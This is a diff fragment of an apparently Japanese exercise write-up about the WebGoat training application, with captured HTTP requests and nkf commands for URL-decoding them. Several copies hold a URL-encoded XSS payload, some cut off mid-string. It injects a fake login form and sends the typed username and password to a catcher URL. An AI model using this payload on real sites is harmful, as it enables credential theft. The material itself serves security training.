@@ -119,9 +119,9 @@ POST /WebGoat/attack?Screen=1382523204&menu=900 HTTP/1.1.
 Host: webgoat.cyexc-target.
 Content-Type: application/x-www-form-urlencoded; charset=UTF-8.
 X-Requested-With: XMLHttpRequest.
-```
+``
 Username=%3C%2Fform%3E%3Cscript%3Efunction+hack()%7B+XSSImage%3Dnew+Image%3B+XSSImage.src%3D%22http%3A%2F%2Fwebgoat.cyexc-target%2FWebGoat%2Fcatcher%3FPROPERTY%3Dyes%26user%3D%22%2B+document.phish.user.value+%2B+%22%26password%3D%22+%2B+document.phish.pass.value+%2B+%22%22%3B+alert(%22Had+this+been+a+real+attack...+Your+credentials+were+just+stolen.+User+Name+%3D+%22+%2B+document.phish.user.value+%2B+%22Password+%3D+%22+%2B+document.phish.pass.value)%3B%7D+%3C%2Fscript%3E%3Cform+name%3D%22phish%22%3E%3Cbr%3E%3Cbr%3E%3CHR%3E%3CH3%3EThis+feature+requires+account+login%3A%3C%2FH3+%3E%3Cbr%3E%3Cbr%3EEnter+Username%3A%3Cbr%3E%3Cinput+type%3D%22text%22+name%3D%22user%22%3E%3Cbr%3EEnter+Password%3A%3Cbr%3E%3Cinput+type%3D%22password%22+name+%3D+%22pass%22%3E%3Cbr%3E%3Cinput+type%3D%22submit%22+name%3D%22login%22+value%3D%22login%22+onclick%3D%22hack()%22%3E%3C%2Fform%3E%3Cbr%3E%3Cbr%3E%3CHR%3E&SUBMIT=Search
-```
+``
  <br>
 上記メッセージをnkfを使用してURLデコード (nkf -w --url-input) すると、   <br>
 $ echo   'Username=%3C%2Fform%3E%3Cscript%3Efunction+hack()%7B+XSSImage%3Dnew+Image%3B+XSSImage.src%3D%22http%3A%2F%2Fwebgoat.cyexc-target%2FWebGoat%2Fcatcher%3FPROPERTY%3Dyes%26user%3D%22%2B+document.phish.user.value+%2B+%22%26password%3D%22+%2B+document.phish.pass.value+%2B+%22%22%3B+alert(%22Had+this+been+a+real+attack...+Your+credentials+were+just+stolen.+User+Name+%3D+%22+%2B+document.phish.user.value+%2B+%22Password+%3D+%22+%2B+document.phish.pass.value)%3B%7D+%3C%2Fscript%3E%3Cform+name%3D%22phish%22%3E%3Cbr%3E%3Cbr%3E%3CHR%3E%3CH3%3EThis+feature+requires+account+login%3A%3C%2FH3+%3E%3Cbr%3E%3Cbr%3EEnter+Username%3A%3Cbr%3E%3Cinput+type%3D%22text%22+name%3D%22user%22%3E%3Cbr%3EEnter+Password%3A%3Cbr%3E%3Cinput+type%3D%22password%22+name+%3D+%22pass%22%3E%3Cbr%3E%3Cinput+type%3D%22submit%22+name%3D%22login%22+value%3D%22login%22+onclick%3D%22hack()%22%3E%3C%2Fform%3E%3Cbr%3E%3Cbr%3E%3CHR%3E&SUBMIT=Search' | nkf -w --url-input   <br>
@@ -137,9 +137,9 @@ POST /WebGoat/attack?Screen=1382523204&menu=900 HTTP/1.1.
 X-Real-IP: 192.168.33.1.
 Host: webgoat.cyexc-target.
 X-Requested-With: XMLHttpRequest.
-```
+``
 Username=%3C%2Fform%3E%3Cscript%3Efunction+hack()%7B+XSSImage%3Dnew+Image%3B+XSSImage.src%3D%22http%3A%2F%2Fwebgoat.cyexc-target%2FWebGoat%2Fcatcher%3FPROPERTY%3Dyes%26user%3D%22%2B+document.phish.user.value+%2B+%22%26password%3D%22+%2B+document.phish.pass.value+%2B+%22%22%3B+alert(%22Had+this+been+a+real+attack...+Your+credentials+were+just+stolen.+User+Name+%3D+%22+%2B+document.phish.user.value+%2B+%22Password+%3D+%22+%2B+document.phish.pass.value)%3B%7D+%3C%2Fscript%3E%3Cform+name%3D%22phish%22%3E%3Cbr%3E%3Cbr%3E%3CHR%3E%3CH3%3EThis+feature+requires+account+login%3A%3C%2FH3+%3E%3Cbr%3E%3Cbr%3EEnter+Username%3A%3Cbr%3E%3Cinput+type%3D%22text%22+name%3D%22user%22%3E%3Cbr%3EEnter+Password%3A%3Cbr%3E%3Cinput+type%3D%22password%22+name+%3D+%22pass%22%3E%3Cbr%
-```
+``
  <br>
 上記メッセージをnkfを使用してURLデコード (nkf -w --url-input) すると、   <br>
 $ echo 'Username=%3C%2Fform%3E%3Cscript%3Efunction+hack()%7B+XSSImage%3Dnew+Image%3B+XSSImage.src%3D%22http%3A%2F%2Fwebgoat.cyexc-target%2FWebGoat%2Fcatcher%3FPROPERTY%3Dyes%26user%3D%22%2B+document.phish.user.value+%2B+%22%26password%3D%22+%2B+document.phish.pass.value+%2B+%22%22%3B+alert(%22Had+this+been+a+real+attack...+Your+credentials+were+just+stolen.+User+Name+%3D+%22+%2B+document.phish.user.value+%2B+%22Password+%3D+%22+%2B+document.phish.pass.value)%3B%7D+%3C%2Fscript%3E%3Cform+name%3D%22phish%22%3E%3Cbr%3E%3Cbr%3E%3CHR%3E%3CH3%3EThis+feature+requires+account+login%3A%3C%2FH3+%3E%3Cbr%3E%3Cbr%3EEnter+Username%3A%3Cbr%3E%3Cinput+type%3D%22text%22+name%3D%22user%22%3E%3Cbr%3EEnter+Password%3A%3Cbr%3E%3Cinput+type%3D%22password%22+name+%3D+%22pass%22%3E%3Cbr%' | nkf -w --url-input   <br>
